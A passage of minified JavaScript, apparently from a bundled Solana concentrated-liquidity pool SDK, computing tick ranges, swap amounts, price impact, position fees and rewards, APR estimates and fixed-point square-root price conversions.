            perSecond: UC.x64ToDecimal(l.emissionsPerSecondX64),
            remainingRewards: void 0,
            tokenProgramId: new Ji(d),
          });
          if (f.tokenMint.equals(Ji.default)) continue;
          if (n <= f.openTime.toNumber() || r.eq(GB)) {
            u.push(f);
            continue;
          }
          let h = new Yn(Math.min(f.endTime.toNumber(), n)),
            p = h.sub(f.lastUpdateTime),
            m = UC.mulDivFloor(p, f.emissionsPerSecondX64, r),
            g = f.rewardGrowthGlobalX64.add(m),
            y = UC.mulDivFloor(p, f.emissionsPerSecondX64, ZB),
            w = f.rewardTotalEmissioned.add(y);
          u.push(
            _A(SA({}, f), {
              rewardGrowthGlobalX64: g,
              rewardTotalEmissioned: w,
              lastUpdateTime: h,
            })
          );
        }
        return u;
      }
      static isOverflowDefaultTickarrayBitmap(t, e) {
        let { maxTickBoundary: n, minTickBoundary: r } = this.tickRange(t);
        for (let o of e) {
          let e = HC.getTickArrayStartIndexByTick(o, t);
          if (e >= n || e < r) return !0;
        }
        return !1;
      }
      static tickRange(t) {
        let e = MC.maxTickInTickarrayBitmap(t),
          n = -e;
        return (
          e > $B && (e = RC.getArrayStartIndex($B, t) + RC.tickCount(t)),
          n < QB && (n = RC.getArrayStartIndex(QB, t)),
          { maxTickBoundary: e, minTickBoundary: n }
        );
      }
      static get_tick_array_offset(t, e) {
        if (!RC.checkIsValidStartIndex(t, e))
          throw new Error("No enough initialized tickArray");
        return (t / RC.tickCount(e)) * VC;
      }
      static async fetchExBitmaps({
        connection: t,
        exBitmapAddress: e,
        batchRequest: n,
      }) {
        let r = await MA(
            t,
            e.map((t) => ({ pubkey: t })),
            { batchRequest: n }
          ),
          o = {};
        for (let i of r)
          null !== i.accountInfo &&
            (o[i.pubkey.toString()] = oE.decode(i.accountInfo.data));
        return o;
      }
      static async fetchMultiplePoolTickArrays({
        connection: t,
        poolKeys: e,
        batchRequest: n,
      }) {
        let r = {},
          o = [];
        for (let a of e) {
          let t = HC.getTickArrayStartIndexByTick(a.tickCurrent, a.tickSpacing),
            e = HC.getInitializedTickArrayInRange(
              a.tickArrayBitmap,
              a.exBitmapInfo,
              a.tickSpacing,
              t,
              7
            );
          for (let n of e) {
            let { publicKey: t } = AC(a.programId, a.id, n);
            o.push({ pubkey: t }), (r[t.toString()] = a.id);
          }
        }
        let i = await MA(t, o, { batchRequest: n }),
          s = {};
        for (let a of i) {
          if (!a.accountInfo) continue;
          let t = r[a.pubkey.toString()];
          if (!t) continue;
          void 0 === s[t.toString()] && (s[t.toString()] = {});
          let e = nE.decode(a.accountInfo.data);
          s[t.toString()][e.startTickIndex] = _A(SA({}, e), {
            address: a.pubkey,
          });
        }
        return s;
      }
      static async fetchPoolsAccountPosition({
        pools: t,
        connection: e,
        ownerInfo: n,
        batchRequest: r = !1,
        updateOwnerRewardAndFee: o = !0,
      }) {
        var i;
        let s = [];
        for (let a = 0; a < t.length; a++) {
          let e = t[a];
          null !== e &&
            (s.find((t) => t.equals(e.state.programId)) ||
              s.push(e.state.programId));
        }
        if (n) {
          let a = n.tokenAccounts.map((t) => t.accountInfo.mint),
            u = [];
          for (let t of a) for (let e of s) u.push(IC(e, t).publicKey);
          let c = await RA(e, u, { batchRequest: r }),
            l = {};
          for (let e of c) {
            if (null === e) continue;
            let n = tE.decode(e.data),
              r = n.poolId.toString(),
              o = t.find((t) => t.state.id.toBase58() === r);
            if (void 0 === o) continue;
            let s = o.state,
              a = HC._getTickPriceLegacy({
                poolInfo: s,
                tick: n.tickLower,
                baseIn: !0,
              }),
              u = HC._getTickPriceLegacy({
                poolInfo: s,
                tick: n.tickUpper,
                baseIn: !0,
              }),
              { amountA: c, amountB: d } = FC.getAmountsFromLiquidity(
                s.sqrtPriceX64,
                a.tickSqrtPriceX64,
                u.tickSqrtPriceX64,
                n.liquidity,
                !1
              ),
              f =
                1 / (1 - Math.sqrt(Math.sqrt(a.price.div(u.price).toNumber())));
            o.positionAccount = [
              ...(null != (i = o.positionAccount) ? i : []),
              {
                poolId: n.poolId,
                nftMint: n.nftMint,
                priceLower: a.price,
                priceUpper: u.price,
                amountA: c,
                amountB: d,
                tickLower: n.tickLower,
                tickUpper: n.tickUpper,
                liquidity: n.liquidity,
                feeGrowthInsideLastX64A: n.feeGrowthInsideLastX64A,
                feeGrowthInsideLastX64B: n.feeGrowthInsideLastX64B,
                tokenFeesOwedA: n.tokenFeesOwedA,
                tokenFeesOwedB: n.tokenFeesOwedB,
                rewardInfos: n.rewardInfos.map((t) =>
                  _A(SA({}, t), { pendingReward: new Yn(0) })
                ),
                leverage: f,
                tokenFeeAmountA: new Yn(0),
                tokenFeeAmountB: new Yn(0),
              },
            ];
            let h = await HC.getTickArrayAddressByTick(
                o.state.programId,
                n.poolId,
                n.tickLower,
                o.state.tickSpacing
              ),
              p = await HC.getTickArrayAddressByTick(
                o.state.programId,
                n.poolId,
                n.tickUpper,
                o.state.tickSpacing
              );
            (l[
              `${o.state.programId.toString()}-${n.poolId.toString()}-${
                n.tickLower
              }`
            ] = h),
              (l[
                `${o.state.programId.toString()}-${n.poolId.toString()}-${
                  n.tickUpper
                }`
              ] = p);
          }
          if (o) {
            let n = Object.values(l),
              o = await RA(e, n, { batchRequest: r }),
              i = {};
            for (let t = 0; t < n.length; t++) {
              let e = o[t];
              null !== e && (i[n[t].toString()] = nE.decode(e.data));
            }
            for (let { state: e, positionAccount: r } of t)
              if (r)
                for (let t of r) {
                  let n = `${e.programId.toString()}-${e.id.toString()}-${
                      t.tickLower
                    }`,
                    r = `${e.programId.toString()}-${e.id.toString()}-${
                      t.tickUpper
                    }`,
                    o = i[l[n].toString()],
                    s = i[l[r].toString()],
                    a =
                      o.ticks[
                        HC.getTickOffsetInArray(t.tickLower, e.tickSpacing)
                      ],
                    u =
                      s.ticks[
                        HC.getTickOffsetInArray(t.tickUpper, e.tickSpacing)
                      ],
                    { tokenFeeAmountA: c, tokenFeeAmountB: d } =
                      await OC.GetPositionFees(e, t, a, u),
                    f = await OC.GetPositionRewards(e, t, a, u);
                  (t.tokenFeeAmountA = c.gte(new Yn(0)) ? c : new Yn(0)),
                    (t.tokenFeeAmountB = d.gte(new Yn(0)) ? d : new Yn(0));
                  for (let e = 0; e < f.length; e++)
                    t.rewardInfos[e].pendingReward = f[e].gte(new Yn(0))
                      ? f[e]
                      : new Yn(0);
                }
          }
        }
        return t;
      }
      static computeAmountOut({
        poolInfo: t,
        tickArrayCache: e,
        baseMint: n,
        epochInfo: r,
        amountIn: o,
        slippage: i,
        priceLimit: s = new bI(0),
        catchLiquidityInsufficient: a = !1,
      }) {
        var u;
        let c,
          l = n.toBase58() === t.mintA.address,
          [d, f] = l
            ? [t.mintA.extensions.feeConfig, t.mintB.extensions.feeConfig]
            : [t.mintB.extensions.feeConfig, t.mintA.extensions.feeConfig];
        c = s.equals(new bI(0))
          ? l
            ? tC.add(new Yn(1))
            : eC.sub(new Yn(1))
          : KC.priceToSqrtPriceX64(s, t.mintA.decimals, t.mintB.decimals);
        let h = K_(o, d, r, !1),
          {
            allTrade: p,
            expectedAmountOut: m,
            remainingAccounts: g,
            executionPrice: y,
            feeAmount: w,
          } = NC.getOutputAmountAndRemainAccounts(
            t,
            e,
            n,
            h.amount.sub(null != (u = h.fee) ? u : GB),
            c,
            a
          ),
          b = K_(m, f, r, !1),
          v = KC.sqrtPriceX64ToPrice(y, t.mintA.decimals, t.mintB.decimals),
          A = l ? v : new bI(1).div(v),
          k = K_(
            m.mul(new Yn(Math.floor(1e10 * (1 - i)))).div(new Yn(1e10)),
            f,
            r,
            !1
          ),
          I = l ? t.currentPrice : new bI(1).div(t.currentPrice),
          S = new bI(A).sub(I).abs(),
          _ = I,
          T = new QI(
            new bI(S).mul(10 ** 15).toFixed(0),
            new bI(_).mul(10 ** 15).toFixed(0)
          );
        return {
          allTrade: p,
          realAmountIn: h,
          amountOut: b,
          minAmountOut: k,
          expirationTime: W_(h.expirationTime, b.expirationTime),
          currentPrice: t.currentPrice,
          executionPrice: A,
          priceImpact: T,
          fee: w,
          remainingAccounts: g,
          executionPriceX64: y,
        };
      }
      static computeAmountOutFormat({
        poolInfo: t,
        tickArrayCache: e,
        amountIn: n,
        tokenOut: r,
        slippage: o,
        epochInfo: i,
        catchLiquidityInsufficient: s = !1,
      }) {
        let a = r.address === t.mintB.address,
          [u, c] = a ? [t.mintA, t.mintB] : [t.mintB, t.mintA],
          [l, d] = [
            new XI(
              _A(SA({}, u), {
                mint: u.address,
                isToken2022: u.programId === Cc.toBase58(),
              })
            ),
            new XI(
              _A(SA({}, c), {
                mint: c.address,
                isToken2022: c.programId === Cc.toBase58(),
              })
            ),
          ],
          {
            allTrade: f,
            realAmountIn: h,
            amountOut: p,
            minAmountOut: m,
            expirationTime: g,
            currentPrice: y,
            executionPrice: w,
            priceImpact: b,
            fee: v,
            remainingAccounts: A,
            executionPriceX64: k,
          } = NC.computeAmountOut({
            poolInfo: t,
            tickArrayCache: e,
            baseMint: new Ji(u.address),
            amountIn: n,
            slippage: o,
            epochInfo: i,
            catchLiquidityInsufficient: s,
          });
        return {
          allTrade: f,
          realAmountIn: _A(SA({}, h), {
            amount: new OI(l, h.amount),
            fee: void 0 === h.fee ? void 0 : new OI(l, h.fee),
          }),
          amountOut: _A(SA({}, p), {
            amount: new OI(d, p.amount),
            fee: void 0 === p.fee ? void 0 : new OI(d, p.fee),
          }),
          minAmountOut: _A(SA({}, m), {
            amount: new OI(d, m.amount),
            fee: void 0 === m.fee ? void 0 : new OI(d, m.fee),
          }),
          expirationTime: g,
          currentPrice: new tS({
            baseToken: l,
            denominator: new Yn(10).pow(new Yn(20 + l.decimals)),
            quoteToken: d,
            numerator: y.mul(new bI(10 ** (20 + d.decimals))).toFixed(0),
          }),
          executionPrice: new tS({
            baseToken: l,
            denominator: new Yn(10).pow(new Yn(20 + l.decimals)),
            quoteToken: d,
            numerator: w.mul(new bI(10 ** (20 + d.decimals))).toFixed(0),
          }),
          priceImpact: b,
          fee: new OI(l, v),
          remainingAccounts: A,
          executionPriceX64: k,
        };
      }
      static computeAmountIn({
        poolInfo: t,
        tickArrayCache: e,
        baseMint: n,
        epochInfo: r,
        amountOut: o,
        slippage: i,
        priceLimit: s = new bI(0),
      }) {
        var a;
        let u,
          c = n.toBase58() === t.mintA.address,
          l = {
            [t.mintA.address]: t.mintA.extensions.feeConfig,
            [t.mintB.address]: t.mintB.extensions.feeConfig,
          };
        u = s.equals(new bI(0))
          ? c
            ? eC.sub(new Yn(1))
            : tC.add(new Yn(1))
          : KC.priceToSqrtPriceX64(s, t.mintA.decimals, t.mintB.decimals);
        let d = K_(o, l[n.toString()], r, !0),
          {
            expectedAmountIn: f,
            remainingAccounts: h,
            executionPrice: p,
            feeAmount: m,
          } = NC.getInputAmountAndRemainAccounts(
            t,
            e,
            n,
            d.amount.sub(null != (a = d.fee) ? a : GB),
            u
          ),
          g = c ? t.mintB.address : t.mintA.address,
          y = K_(f, l[g], r, !1),
          w = KC.sqrtPriceX64ToPrice(p, t.mintA.decimals, t.mintB.decimals),
          b = c ? w : new bI(1).div(w),
          v = K_(
            f.mul(new Yn(Math.floor(1e10 * (1 + i)))).div(new Yn(1e10)),
            l[g],
            r,
            !0
          ),
          A = c ? t.currentPrice : new bI(1).div(t.currentPrice),
          k = new bI(b).sub(A).abs(),
          I = A,
          S = new QI(
            new bI(k).mul(10 ** 15).toFixed(0),
            new bI(I).mul(10 ** 15).toFixed(0)
          );
        return {
          amountIn: y,
          maxAmountIn: v,
          realAmountOut: d,
          expirationTime: W_(y.expirationTime, d.expirationTime),
          currentPrice: t.currentPrice,
          executionPrice: b,
          priceImpact: S,
          fee: m,
          remainingAccounts: h,
        };
      }
      static estimateAprsForPriceRangeMultiplier({
        poolInfo: t,
        aprType: e,
        positionTickLowerIndex: n,
        positionTickUpperIndex: r,
      }) {
        var o, i, s;
        let a,
          u = t[e],
          c = HC.getTickPrice({
            poolInfo: t,
            tick: n,
            baseIn: !0,
          }).price.toNumber(),
          l = HC.getTickPrice({
            poolInfo: t,
            tick: r,
            baseIn: !0,
          }).price.toNumber(),
          d = Math.max(c, u.priceMin),
          f = Math.min(l, u.priceMax) - d,
          h = l - c,
          p = u.priceMax - u.priceMin;
        return (
          (a =
            f <= 0 ? 0 : h === f ? p / f : p === f ? f / h : (f / p) * (f / h)),
          {
            feeApr: u.feeApr * a,
            rewardsApr: [
              (null != (o = u.rewardApr[0]) ? o : 0) * a,
              (null != (i = u.rewardApr[1]) ? i : 0) * a,
              (null != (s = u.rewardApr[2]) ? s : 0) * a,
            ],
            apr: u.apr * a,
          }
        );
      }
      static estimateAprsForPriceRangeDelta({
        poolInfo: t,
        poolLiquidity: e,
        aprType: n,
        mintPrice: r,
        liquidity: o,
        positionTickLowerIndex: i,
        positionTickUpperIndex: s,
        chainTime: a,
      }) {
        let u = "day" === n ? 1 : "week" === n ? 7 : "month" === n ? 30 : 0,
          c = t[n],
          l = r[HI(t.mintA.address).toString()],
          d = r[HI(t.mintB.address).toString()],
          f = t.mintA.decimals,
          h = t.mintB.decimals;
        if (!c || !l || !d) return { feeApr: 0, rewardsApr: [0, 0, 0], apr: 0 };
        let p = KC.priceToSqrtPriceX64(
            new bI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          m = KC.getSqrtPriceX64FromTick(i),
          g = KC.getSqrtPriceX64FromTick(s),
          { amountSlippageA: y, amountSlippageB: w } =
            FC.getAmountsFromLiquidityWithSlippage(p, m, g, e, !1, !1, 0),
          { amountSlippageA: b, amountSlippageB: v } =
            FC.getAmountsFromLiquidityWithSlippage(p, m, g, o, !1, !1, 0),
          A = new bI(y.toString())
            .div(new bI(10).pow(f))
            .mul(l.value)
            .add(new bI(w.toString()).div(new bI(10).pow(h)).mul(d.value)),
          k = new bI(b.toString())
            .div(new bI(10).pow(f))
            .mul(l.value)
            .add(new bI(v.toString()).div(new bI(10).pow(h)).mul(d.value)),
          I = new bI(1).div(A.add(k)),
          S = new bI(c.volumeFee).mul(365).div(u).mul(I).mul(100).toNumber(),
          _ = t.rewardDefaultInfos.map((t) => {
            var e, n;
            let o = t.mint.decimals,
              i = r[t.mint.address];
            return a < (null != (e = t.startTime) ? e : 0) ||
              a > (null != (n = t.endTime) ? n : 0) ||
              !t.perSecond ||
              !i ||
              void 0 === o
              ? 0
              : new bI(i.value)
                  .mul(new bI(t.perSecond).mul(31536e3))
                  .div(new bI(10).pow(o))
                  .mul(I)
                  .mul(100)
                  .toNumber();
          });
        return {
          feeApr: S,
          rewardsApr: _,
          apr: S + _.reduce((t, e) => t + e, 0),
        };
      }
      static async getLiquidityAmountOutFromAmountIn({
        poolInfo: t,
        inputA: e,
        tickLower: n,
        tickUpper: r,
        amount: o,
        slippage: i,
        add: s,
        epochInfo: a,
        amountHasFee: u,
      }) {
        var c, l;
        let d,
          f = KC.priceToSqrtPriceX64(
            new bI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          h = KC.getSqrtPriceX64FromTick(n),
          p = KC.getSqrtPriceX64FromTick(r),
          m = K_(
            o,
            null == (c = t[e ? "mintA" : "mintB"].extensions)
              ? void 0
              : c.feeConfig,
            a,
            !u
          ),
          g = new Yn(
            new bI(
              m.amount.sub(null != (l = m.fee) ? l : GB).toString()
            ).toFixed(0)
          );
        if (f.lte(h))
          d = e ? FC.getLiquidityFromTokenAmountA(h, p, g, !s) : new Yn(0);
        else if (f.lte(p)) {
          let t = FC.getLiquidityFromTokenAmountA(f, p, g, !s),
            n = FC.getLiquidityFromTokenAmountB(h, f, g);
          d = e ? t : n;
        } else d = e ? new Yn(0) : FC.getLiquidityFromTokenAmountB(h, p, g);
        let y = await NC.getAmountsFromLiquidity({
          epochInfo: a,
          poolInfo: t,
          tickLower: n,
          tickUpper: r,
          liquidity: d,
          slippage: i,
          add: s,
        });
        return {
          liquidity: d,
          amountA: e ? m : y.amountA,
          amountB: e ? y.amountB : m,
          amountSlippageA: e ? m : y.amountSlippageA,
          amountSlippageB: e ? y.amountSlippageB : m,
          expirationTime: y.expirationTime,
        };
      }
      static async getAmountsFromLiquidity({
        epochInfo: t,
        poolInfo: e,
        tickLower: n,
        tickUpper: r,
        liquidity: o,
        slippage: i,
        add: s,
      }) {
        var a, u, c, l;
        let d = KC.getSqrtPriceX64FromTick(n),
          f = KC.getSqrtPriceX64FromTick(r),
          h = s ? 1 + i : 1 - i,
          p = FC.getAmountsFromLiquidity(
            KC.priceToSqrtPriceX64(
              new bI(e.price),
              e.mintA.decimals,
              e.mintB.decimals
            ),
            d,
            f,
            o,
            s
          ),
          [m, g] = [
            K_(
              p.amountA,
              null == (a = e.mintA.extensions) ? void 0 : a.feeConfig,
              t,
              !0
            ),
            K_(
              p.amountB,
              null == (u = e.mintB.extensions) ? void 0 : u.feeConfig,
              t,
              !0
            ),
          ],
          [y, w] = [
            K_(
              p.amountA.muln(h),
              null == (c = e.mintA.extensions) ? void 0 : c.feeConfig,
              t,
              !0
            ),
            K_(
              p.amountB.muln(h),
              null == (l = e.mintB.extensions) ? void 0 : l.feeConfig,
              t,
              !0
            ),
          ];
        return {
          liquidity: o,
          amountA: m,
          amountB: g,
          amountSlippageA: y,
          amountSlippageB: w,
          expirationTime: W_(m.expirationTime, g.expirationTime),
        };
      }
      static async fetchComputeMultipleClmmInfo({
        connection: t,
        poolList: e,
        rpcDataMap: n = {},
      }) {
        let r = e.filter((t) => !n[t.id]).map((t) => new Ji(t.id));
        (await RA(t, r)).forEach((t, e) => {
          !t || (n[r[e].toBase58()] = QC.decode(t.data));
        });
        let o = e.map((t) => TC(new Ji(t.programId), new Ji(t.id)).publicKey),
          i = await NC.fetchExBitmaps({
            connection: t,
            exBitmapAddress: o,
            batchRequest: !1,
          });
        return e.reduce(
          (t, e) =>
            _A(SA({}, t), {
              [e.id]: _A(SA({}, n[e.id]), {
                id: new Ji(e.id),
                version: 6,
                programId: new Ji(e.programId),
                mintA: e.mintA,
                mintB: e.mintB,
                ammConfig: _A(SA({}, e.config), {
                  id: new Ji(e.config.id),
                  fundOwner: "",
                }),
                currentPrice: new bI(e.price),
                exBitmapAccount: TC(new Ji(e.programId), new Ji(e.id))
                  .publicKey,
                exBitmapInfo:
                  i[TC(new Ji(e.programId), new Ji(e.id)).publicKey.toBase58()],
                startTime: n[e.id].startTime.toNumber(),
                rewardInfos: n[e.id].rewardInfos,
              }),
            }),
          {}
        );
      }
      static async fetchComputeClmmInfo({
        connection: t,
        poolInfo: e,
        rpcData: n,
      }) {
        return (
          await this.fetchComputeMultipleClmmInfo({
            connection: t,
            rpcDataMap: n ? { [e.id]: n } : void 0,
            poolList: [e],
          })
        )[e.id];
      }
    },
    DC = {
      volume: 0,
      volumeQuote: 0,
      volumeFee: 0,
      apr: 0,
      feeApr: 0,
      priceMin: 0,
      priceMax: 0,
      rewardApr: [],
    };
  var UC = class {
    static mulDivRoundingUp(t, e, n) {
      let r = t.mul(e),
        o = r.div(n);
      return r.mod(n).eq(GB) || (o = o.add(VB)), o;
    }
    static mulDivFloor(t, e, n) {
      if (n.eq(GB)) throw new Error("division by 0");
      return t.mul(e).div(n);
    }
    static mulDivCeil(t, e, n) {
      if (n.eq(GB)) throw new Error("division by 0");
      return t.mul(e).add(n.sub(VB)).div(n);
    }
    static x64ToDecimal(t, e) {
      return new bI(t.toString()).div(bI.pow(2, 64)).toDecimalPlaces(e);
    }
    static decimalToX64(t) {
      return new Yn(t.mul(bI.pow(2, 64)).floor().toFixed());
    }
    static wrappingSubU128(t, e) {
      return t.add(XB).sub(e).mod(XB);
    }
  };
  function qC(t, e) {
    return zC(t.mul(e), 64, 256);
  }
  function zC(t, e, n) {
    let r = t.toTwos(n).shrn(e);
    return r.imaskn(n - e + 1), r.fromTwos(n - e);
  }
  var KC = class {
      static sqrtPriceX64ToPrice(t, e, n) {
        return UC.x64ToDecimal(t)
          .pow(2)
          .mul(bI.pow(10, e - n));
      }
      static priceToSqrtPriceX64(t, e, n) {
        return UC.decimalToX64(t.mul(bI.pow(10, n - e)).sqrt());
      }
      static getNextSqrtPriceX64FromInput(t, e, n, r) {
        if (!t.gt(GB)) throw new Error("sqrtPriceX64 must greater than 0");
        if (!e.gt(GB)) throw new Error("liquidity must greater than 0");
        return r
          ? this.getNextSqrtPriceFromTokenAmountARoundingUp(t, e, n, !0)
          : this.getNextSqrtPriceFromTokenAmountBRoundingDown(t, e, n, !0);
      }
      static getNextSqrtPriceX64FromOutput(t, e, n, r) {
        if (!t.gt(GB)) throw new Error("sqrtPriceX64 must greater than 0");
        if (!e.gt(GB)) throw new Error("liquidity must greater than 0");
        return r
          ? this.getNextSqrtPriceFromTokenAmountBRoundingDown(t, e, n, !1)
          : this.getNextSqrtPriceFromTokenAmountARoundingUp(t, e, n, !1);
      }
      static getNextSqrtPriceFromTokenAmountARoundingUp(t, e, n, r) {
        if (n.eq(GB)) return t;
        let o = e.shln(64);
        if (r) {
          let e = o,
            r = o.add(n.mul(t));
          return r.gte(e)
            ? UC.mulDivCeil(e, t, r)
            : UC.mulDivRoundingUp(e, VB, e.div(t).add(n));
        }
        {
          let e = n.mul(t);
          if (!o.gt(e))
            throw new Error(
              "getNextSqrtPriceFromTokenAmountARoundingUp,liquidityLeftShift must gt amountMulSqrtPrice"
            );
          let r = o.sub(e);
          return UC.mulDivCeil(o, t, r);
        }
      }
      static getNextSqrtPriceFromTokenAmountBRoundingDown(t, e, n, r) {
        let o = n.shln(64);
        if (r) return t.add(o.div(e));
        {
          let n = UC.mulDivRoundingUp(o, VB, e);
          if (!t.gt(n))
            throw new Error(
              "getNextSqrtPriceFromTokenAmountBRoundingDown sqrtPriceX64 must gt amountDivLiquidity"
            );
          return t.sub(n);
        }
      }
      static getSqrtPriceX64FromTick(t) {
        if (!Number.isInteger(t)) throw new Error("tick must be integer");
        if (t < QB || t > $B)
          throw new Error("tick must be in MIN_TICK and MAX_TICK");
        let e = t < 0 ? -1 * t : t,
          n = new Yn(1 & e ? "18445821805675395072" : "18446744073709551616");
        return (
          !!(2 & e) && (n = qC(n, new Yn("18444899583751176192"))),
          !!(4 & e) && (n = qC(n, new Yn("18443055278223355904"))),
          !!(8 & e) && (n = qC(n, new Yn("18439367220385607680"))),
          !!(16 & e) && (n = qC(n, new Yn("18431993317065453568"))),
          !!(32 & e) && (n = qC(n, new Yn("18417254355718170624"))),
          !!(64 & e) && (n = qC(n, new Yn("18387811781193609216"))),
          !!(128 & e) && (n = qC(n, new Yn("18329067761203558400"))),
          !!(256 & e) && (n = qC(n, new Yn("18212142134806163456"))),
          !!(512 & e) && (n = qC(n, new Yn("17980523815641700352"))),
          !!(1024 & e) && (n = qC(n, new Yn("17526086738831433728"))),
          !!(2048 & e) && (n = qC(n, new Yn("16651378430235570176"))),
          !!(4096 & e) && (n = qC(n, new Yn("15030750278694412288"))),
          !!(8192 & e) && (n = qC(n, new Yn("12247334978884435968"))),
          !!(16384 & e) && (n = qC(n, new Yn("8131365268886854656"))),
          !!(32768 & e) && (n = qC(n, new Yn("3584323654725218816"))),
          !!(65536 & e) && (n = qC(n, new Yn("696457651848324352"))),
          !!(131072 & e) && (n = qC(n, new Yn("26294789957507116"))),
          !!(262144 & e) && (n = qC(n, new Yn("37481735321082"))),
          t > 0 && (n = YB.div(n)),
          n
        );
      }
      static getTickFromPrice(t, e, n) {
        return KC.getTickFromSqrtPriceX64(KC.priceToSqrtPriceX64(t, e, n));
      }
      static getTickFromSqrtPriceX64(t) {
        if (t.gt(eC) || t.lt(tC))
          throw new Error(
            "Provided sqrtPrice is not within the supported sqrtPrice range."
          );
        let e = t.bitLength() - 1,
          n = (function (t, e, n) {
            let r = t.toTwos(n).shln(e);
            return r.imaskn(n + 1), r.fromTwos(n);
          })(new Yn(e - 64), 32, 128),
          r = new Yn("8000000000000000", "hex"),
          o = 0,
          i = new Yn(0),
          s = e >= 64 ? t.shrn(e - 63) : t.shln(63 - e);
        for (; r.gt(new Yn(0)) && o < 16; ) {
          s = s.mul(s);
          let t = s.shrn(127);
          (s = s.shrn(63 + t.toNumber())),
            (i = i.add(r.mul(t))),
            (r = r.shrn(1)),
            (o += 1);
        }
        let a = i.shrn(32),
          u = n.add(a).mul(new Yn("59543866431248")),
          c = zC(u.sub(new Yn("184467440737095516")), 64, 128).toNumber(),
          l = zC(u.add(new Yn("15793534762490258745")), 64, 128).toNumber();
        return c == l ? c : KC.getSqrtPriceX64FromTick(l).lte(t) ? l : c;
      }
    },
    WC = class {
      static getTickWithPriceAndTickspacing(t, e, n, r) {
        let o = KC.getTickFromSqrtPriceX64(KC.priceToSqrtPriceX64(t, n, r)) / e;
        return (o = o < 0 ? Math.floor(o) : Math.ceil(o)), o * e;
      }
      static roundPriceWithTickspacing(t, e, n, r) {
        let o = WC.getTickWithPriceAndTickspacing(t, e, n, r),
          i = KC.getSqrtPriceX64FromTick(o);
        return KC.sqrtPriceX64ToPrice(i, n, r);
      }
    },
    FC = class {
      static addDelta(t, e) {
        return t.add(e);
      }
      static getTokenAmountAFromLiquidity(t, e, n, r) {
        if ((t.gt(e) && ([t, e] = [e, t]), !t.gt(GB)))
          throw new Error("sqrtPriceX64A must greater than 0");
        let o = n.ushln(64),
          i = e.sub(t);
        return r
          ? UC.mulDivRoundingUp(UC.mulDivCeil(o, i, e), VB, t)
          : UC.mulDivFloor(o, i, e).div(t);
      }
      static getTokenAmountBFromLiquidity(t, e, n, r) {
        if ((t.gt(e) && ([t, e] = [e, t]), !t.gt(GB)))
          throw new Error("sqrtPriceX64A must greater than 0");
        return r
          ? UC.mulDivCeil(n, e.sub(t), ZB)
          : UC.mulDivFloor(n, e.sub(t), ZB);
      }
      static getLiquidityFromTokenAmountA(t, e, n, r) {
        t.gt(e) && ([t, e] = [e, t]);
        let o = n.mul(t).mul(e),
          i = e.sub(t),
          s = o.div(i);
        return r ? UC.mulDivRoundingUp(s, VB, JB) : s.shrn(64);
      }
      static getLiquidityFromTokenAmountB(t, e, n) {
        return t.gt(e) && ([t, e] = [e, t]), UC.mulDivFloor(n, JB, e.sub(t));
      }
      static getLiquidityFromTokenAmounts(t, e, n, r, o) {
        if ((e.gt(n) && ([e, n] = [n, e]), t.lte(e)))
          return FC.getLiquidityFromTokenAmountA(e, n, r, !1);
        if (t.lt(n)) {
          let i = FC.getLiquidityFromTokenAmountA(t, n, r, !1),
            s = FC.getLiquidityFromTokenAmountB(e, t, o);
          return i.lt(s) ? i : s;
        }
        return FC.getLiquidityFromTokenAmountB(e, n, o);
      }
      static getAmountsFromLiquidity(t, e, n, r, o) {
        if ((e.gt(n) && ([e, n] = [n, e]), t.lte(e)))
          return {
            amountA: FC.getTokenAmountAFromLiquidity(e, n, r, o),
            amountB: new Yn(0),
          };
        if (t.lt(n)) {
          return {
            amountA: FC.getTokenAmountAFromLiquidity(t, n, r, o),
            amountB: FC.getTokenAmountBFromLiquidity(e, t, r, o),
          };
        }
        return {
          amountA: new Yn(0),
          amountB: FC.getTokenAmountBFromLiquidity(e, n, r, o),
        };
      }
      static getAmountsFromLiquidityWithSlippage(t, e, n, r, o, i, s) {
        let { amountA: a, amountB: u } = FC.getAmountsFromLiquidity(
            t,
            e,
            n,
            r,
            i
          ),
          c = o ? 1 + s : 1 - s;
        return {
          amountSlippageA: new Yn(new bI(a.toString()).mul(c).toFixed(0)),
          amountSlippageB: new Yn(new bI(u.toString()).mul(c).toFixed(0)),
        };
      }
      static getAmountsOutFromLiquidity({
        poolInfo: t,
        tickLower: e,
        tickUpper: n,
        liquidity: r,
        slippage: o,
        add: i,
        epochInfo: s,
        amountAddFee: a,
      }) {
        var u, c, l, d;
        let f = KC.priceToSqrtPriceX64(
            new bI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          h = KC.getSqrtPriceX64FromTick(e),
          p = KC.getSqrtPriceX64FromTick(n),
          m = i ? 1 + o : 1 - o,
          g = FC.getAmountsFromLiquidity(f, h, p, r, i),
          [y, w] = [
            K_(
              g.amountA,
              null == (u = t.mintA.extensions) ? void 0 : u.feeConfig,
              s,
              a
            ),
            K_(
              g.amountB,
              null == (c = t.mintB.extensions) ? void 0 : c.feeConfig,
              s,
              a
            ),
          ],
          [b, v] = [
            K_(
              new Yn(new bI(g.amountA.toString()).mul(m).toFixed(0)),
              null == (l = t.mintA.extensions) ? void 0 : l.feeConfig,
              s,
              a
            ),
            K_(
              new Yn(new bI(g.amountB.toString()).mul(m).toFixed(0)),
              null == (d = t.mintB.extensions) ? void 0 : d.feeConfig,
              s,
              a
            ),
          ];
        return {
          liquidity: r,
          amountA: y,
          amountB: w,
          amountSlippageA: b,
          amountSlippageB: v,
          expirationTime: W_(y.expirationTime, w.expirationTime),
        };
      }
    },
    jC = class {
      static swapCompute(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p = !1) {
        if (d.eq(GB)) throw new Error("amountSpecified must not be 0");
        if ((h || (h = i ? tC.add(VB) : eC.sub(VB)), i)) {
          if (h.lt(tC))
            throw new Error(
              "sqrtPriceX64 must greater than MIN_SQRT_PRICE_X64"
            );
          if (h.gte(l))
            throw new Error("sqrtPriceX64 must smaller than current");
        } else {
          if (h.gt(eC))
            throw new Error(
              "sqrtPriceX64 must smaller than MAX_SQRT_PRICE_X64"
            );
          if (h.lte(l))
            throw new Error("sqrtPriceX64 must greater than current");
        }
        let m = d.gt(GB),
          g = {
            amountSpecifiedRemaining: d,
            amountCalculated: GB,
            sqrtPriceX64: l,
            tick: u > f ? Math.min(f + RC.tickCount(c) - 1, u) : f,
            accounts: [],
            liquidity: a,
            feeAmount: new Yn(0),
          },
          y = f,
          w = n[f],
          b = !i && w.startTickIndex === g.tick;
